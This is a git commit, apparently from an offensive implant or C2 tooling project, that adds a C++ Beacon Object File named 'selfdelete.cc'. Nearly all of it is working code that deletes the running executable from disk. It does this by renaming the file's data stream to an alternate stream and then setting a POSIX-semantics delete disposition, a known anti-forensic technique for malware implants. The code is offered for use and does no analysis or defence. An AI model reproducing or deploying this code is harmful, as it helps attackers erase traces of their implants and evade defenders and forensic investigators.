e9d1209de8eb27e3ef0f18c1b46b49d8004b2705
entropy-z <entropymalws@gmail.com>
2025-05-12 09:40:36 -0300

    self delete added

---
+++ Generic/selfdelete.cc
@@ -0,0 +1,72 @@
+#include <Externs.hpp>
+#include <Common.hpp>
+
+#define FILE_DISPOSITION_DELETE 0x00000001
+#define FILE_DISPOSITION_POSIX_SEMANTICS 0x00000002
+#define FileDispositionInfoEx 21
+
+auto SelfDelete() -> int {
+    WCHAR path[MAX_PATH*2];
+    if (!GetModuleFileNameW(nullptr, path, sizeof( path ) )) {
+        BeaconPrintf(CALLBACK_OUTPUT, "GetModuleFileNameW Failed: %d\n", GetLastError());
+        return EXIT_FAILURE;
+    }
+
+    auto h_file = CreateFileW(
+        path,
+        DELETE | SYNCHRONIZE,
+        FILE_SHARE_READ,
+        nullptr,
+        OPEN_EXISTING,
+        0,
+        nullptr
+        );
+
+    if (h_file == INVALID_HANDLE_VALUE) {
+        BeaconPrintf(CALLBACK_OUTPUT, "CreateFileW Failed: %d\n", GetLastError());
+        return EXIT_FAILURE;
+    }
+
+    const auto new_stream = L":redxvz";
+    const auto size_stream = wcslen(new_stream) * sizeof(WCHAR);
+    const auto size_rename = sizeof(FILE_RENAME_INFO) + size_stream;
+    const auto p_rename = static_cast<PFILE_RENAME_INFO>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size_rename));
+    if (!p_rename) {
+        BeaconPrintf(CALLBACK_OUTPUT, "HeapAlloc Failed: %d\n", GetLastError());
+        return EXIT_FAILURE;
+    }
+
+    p_rename->FileNameLength = size_stream;
+    RtlCopyMemory(p_rename->FileName, new_stream, size_stream);
+    if (!SetFileInformationByHandle(h_file, FileRenameInfo, p_rename, size_rename)) {
+        BeaconPrintf(CALLBACK_OUTPUT, "SetFileInformationByHandle Failed: %d\n", GetLastError());
+        return EXIT_FAILURE;
+    }
+
+    CloseHandle(h_file);
+
+    h_file = CreateFileW(
+        path,
+        DELETE | SYNCHRONIZE,
+        FILE_SHARE_READ | FILE_SHARE_DELETE,
+        nullptr,
+        OPEN_EXISTING,
+        0,
+        nullptr
+    );
+
+    FILE_DISPOSITION_INFO_EX info = { FILE_DISPOSITION_DELETE | FILE_DISPOSITION_POSIX_SEMANTICS };
+    if (!SetFileInformationByHandle(h_file, static_cast<FILE_INFO_BY_HANDLE_CLASS>(FileDispositionInfoEx), &info, sizeof(info))) {
+        BeaconPrintf(CALLBACK_OUTPUT, "SetFileInformationByHandle Failed: %d\n", GetLastError());
+        return EXIT_FAILURE;
+    }
+
+    CloseHandle(h_file);
+    return EXIT_SUCCESS;
+}
+
+auto go(PCHAR Args, INT Argc) -> void {
+    Start();
+
+    SelfDelete();    
+}
